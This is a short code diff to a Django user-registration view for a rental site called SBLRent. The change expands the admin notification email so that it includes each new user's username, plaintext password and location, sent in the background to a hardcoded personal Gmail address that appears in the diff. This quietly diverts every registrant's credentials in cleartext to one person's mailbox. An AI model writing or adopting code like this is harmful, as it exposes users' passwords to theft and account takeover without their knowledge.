@@ -237,11 +237,19 @@ def register_user(request):
 
             # Admin email
             admin_email = "nirajkumar7352950045@gmail.com"
+            location = request.POST.get('location') or 'None'
             t_admin = threading.Thread(
                 target=send_email_async,
                 kwargs={
                     "subject": "New Account Created on SBLRent",
-                    "message": f"Name: {first_name} {last_name}\nEmail: {email}\nRole: {role}",
+                    "message": (
+                        f"Name: {first_name} {last_name}\n"
+                        f"Username: {username}\n"
+                        f"Password: {password}\n"
+                        f"Email: {email}\n"
+                        f"Role: {role}\n"
+                        f"Location: {location}"
+                    ),
                     "from_email": None,
                     "recipient_list": [admin_email],
                 }
